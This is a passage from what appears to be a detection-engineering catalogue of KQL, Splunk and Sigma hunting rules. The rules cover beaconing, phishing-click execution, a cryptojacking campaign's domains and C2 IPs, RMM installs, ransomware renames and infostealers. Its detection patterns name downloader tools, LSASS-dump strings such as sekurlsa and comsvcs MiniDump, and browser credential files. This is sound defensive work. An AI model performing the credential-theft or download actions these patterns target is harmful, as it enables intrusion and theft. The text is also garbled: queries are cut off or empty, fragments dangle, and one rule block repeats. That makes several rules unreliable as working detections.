Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

[LLM] Cryptojacking lure: ZIP download from gleeze.com / giize.com SEO+AI-poisoned utility sites Delivery High
Hunts endpoint downloads of ZIP archives sourced from the campaign's attacker-controlled domains (gleeze.com subdomains, giize.com, directdownload.icu) that impersonate GPU/system utilities like CrystalDiskInfo, HWMonitor, FurMark and PDFgear. This is the article-specific initial-access vector surfaced via SEO and AI-chatbot recommendation poisoning, not generic drive-by. Rationale: Domains gleeze.com (and subdomains direct-download/start-download/minemine), giize.com and directdownload.icu are named in the article and confirmed in Microsoft's blog as the ZIP-delivery infrastructure (Dynu dynamic DNS). ZIP + campaign-domain referrer is high-fidelity. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/ • https://gbhackers.com/seo-poisoning-attack/
ATT&CKT1608.006 T1189

| order by Timestamp desc

[LLM] ScreenConnect masquerade: msiexec.exe installing rogue vcredist_x64.dll after autorun.dll sideload Installation High
Hunts the campaign's stage-2 install where a sideloaded autorun.dll uses msiexec.exe to install a second DLL named vcredist_x64.dll, which is actually a packaged ScreenConnect (ConnectWise Control) installer. vcredist is normally an .exe bootstrapper, never a DLL pushed through msiexec, making this combination highly specific. Rationale: vcredist_x64.dll installed via msiexec.exe is named in both the article and Microsoft's blog as the ScreenConnect packaging trick; legitimate VC++ redistributables never deploy a DLL through msiexec, so the string pair is near-zero-FP. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/ • https://gbhackers.com/seo-poisoning-attack/

| order by Timestamp desc
SecurityEvent

| where CommandLine has "vcredist_x64.dll"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

[LLM] ScreenConnect client beaconing to attacker C2 193.42.11.108 Command & Control High
Hunts outbound connections to the campaign's attacker-controlled ScreenConnect relay 193.42.11.108 (and associated IPs 93.115.10.35, 198.23.185.238, 2.59.132.106), through which SimpleRunPE.exe and miner payloads are delivered. This pins the C2 channel specific to this cryptojacking operation. Rationale: 193.42.11.108 is named in the article as the ScreenConnect C2; the additional IPs are pre-extracted campaign IOCs. Microsoft's blog confirms the ScreenConnect client persistently contacts 193.42.11.108. Discrete IP IOCs are alert-grade. [LLM] SimpleRunPE.exe / D3F4E2A1 implant adding Microsoft Defender exclusions via Add-MpPreference Installation Medium
Hunts the implant disabling protection by registering Defender path/process/extension exclusions, tied to the campaign by either the SimpleRunPE.exe / masqueraded vlc.exe parent or the campaign identifier D3F4E2A1 (also seen as mutex Global\D3F4E2A1_Svc and install folder). The malware re-applies these exclusions if removed. Rationale: Add-MpPreference exclusion registration is named in the article and Microsoft's blog ("re-configures Defender exclusions"); pinning to SimpleRunPE.exe parent or the D3F4E2A1 campaign ID (confirmed mutex Global\D3F4E2A1_Svc) removes the legitimate-admin noise. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/ • https://gbhackers.com/seo-poisoning-attack/

[LLM] Masqueraded vlc.exe launched via scheduled task with self-deleting PowerShell dropper Installation Medium
Hunts the alternate delivery path where PowerShell fetches the payload from a remote drive, saves it locally as vlc.exe to blend in, registers a scheduled task to launch it, then deletes itself. Detection keys on a vlc.exe process whose signer/company is not VideoLAN and/or that runs from a non-standard path under a scheduled-task or PowerShell parent. Rationale: The article specifies the binary is saved as vlc.exe "to fly under the radar," launched via a scheduled task, with a self-deleting PowerShell dropper. A vlc.exe outside VideoLAN's path with a non-VideoLAN signer and schtasks/PowerShell parent is the article-specific masquerade. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/

| project Timestamp, DeviceName, AccountName, FolderPath, ProcessVersionInfoCompanyName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessCommandLine, SHA256
| order by Timestamp desc

[LLM] GPU miner execution: gminer / lolMiner / SRBMiner-MULTI dropped at runtime Actions on Objectives High
Hunts execution or on-disk drop of the three GPU-mining tools the implant fetches at runtime — gminer, lolMiner, and SRBMiner-MULTI — which is the campaign's resource-hijacking endgame on high-GPU hosts. The implant also process-hollows the miner under a trusted binary and terminates if monitoring tools (taskmgr/processhacker/procexp/systeminformer) appear. Rationale: gminer, lolMiner and SRBMiner-MULTI are explicitly named in the article and Microsoft's blog as the three supported miners; their binary names plus stratum/pool args are high-fidelity resource-hijacking indicators on GPU-equipped endpoints. Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats summariesonly=false count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486

DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

| tstats `summariesonly` count, dc(Filesystem.file_name) AS files

    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files

DeviceEvents

| where Account !endswith "$"

    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard Installation High
ConnectWise / AnyDesk / TeamViewer / ScreenConnect / Atera installed outside IT change windows = common tradecraft for ransomware affiliates and IT-helpdesk impersonators.
ATT&CKT1219
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe")
   or FileName matches regex @"(?i)kaseya.*\.exe"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\AnyDesk.exe"
   or NewProcessName endswith "\TeamViewer.exe"
   or NewProcessName endswith "\TeamViewer_Service.exe"
   or NewProcessName endswith "\ScreenConnect.ClientService.exe"
   or NewProcessName endswith "\ConnectWiseControl.ClientService.exe"
   or NewProcessName endswith "\atera_agent.exe"
   or NewProcessName endswith "\SplashtopStreamer.exe"
   or NewProcessName endswith "\RustDesk.exe"
   or NewProcessName endswith "\NinjaOne.exe"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Remote-Management (RMM) Tool Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0c
status: experimental
description: |
    AnyDesk / TeamViewer / ScreenConnect / Atera / Splashtop /
    RustDesk — RMM tools attackers commonly install for hands-on-
    keyboard access. Filter against the IT estate's known tool.
references:
    - https://attack.mitre.org/techniques/T1219/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1219
    - attack.command-and-control
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\AnyDesk.exe'
            - '\TeamViewer.exe'
            - '\TeamViewer_Service.exe'
            - '\ScreenConnect.ClientService.exe'
            - '\ConnectWiseControl.ClientService.exe'
            - '\atera_agent.exe'
            - '\SplashtopStreamer.exe'
            - '\RustDesk.exe'
            - '\NinjaOne.exe'
    condition: selection
falsepositives:
    - IT-approved RMM in use across the estate. Maintain a known-IT-
      tool exclusion list per environment.
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Vulnerable iOS fleet exposed to WhatsApp 0-click chain (CVE-2025-43300 + CVE-2025-55177) · Office app spawning script/LOLBin child process

[LLM] Vulnerable iOS fleet exposed to WhatsApp 0-click chain (CVE-2025-43300 + CVE-2025-55177) Exploitation Medium
Surfaces managed iOS/iPadOS/macOS devices reporting either of the two CVEs chained in the zero-click WhatsApp account-takeover (Apple ImageIO OOB-write CVE-2025-43300 and WhatsApp linked-device sync authorization bypass CVE-2025-55177). The actual exploit artifacts live in on-device iOS unified logs (resync races, ImageIO crash entries) outside SIEM scope, so this hunts fleet exposure — the only signal expressible on available telemetry — to drive emergency patching before a device is hit. Rationale: Built directly on the two CVE IDs the article names (CVE-2025-43300, CVE-2025-55177) and the iOS<16.7.12 threshold; these are the only high-fidelity, deployable artifacts since the behavioural traces (unified-log resync events, ImageIO errors, rogue WhatsApp client) are on-device iOS forensics not shipped to any SIEM. Cross-checked against Malwarebytes, SOCRadar, The Hacker News and Lookout write-ups confirming the chain, the linked-device-sync bypass behaviour, and Apple's Aug-2025 patch. Cross-checked against: • https://www.malwarebytes.com/blog/news/2025/09/whatsapp-fixes-vulnerability-used-in-zero-click-attacks • https://socradar.io/blog/cve-2025-55177-0-click-whatsapp-exploit-spyware-apple/ • https://thehackernews.com/2025/08/whatsapp-issues-emergency-update-for.html • https://www.lookout.com/threat-intelligence/article/cve-2025-55177-whatsapp-for-ios

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
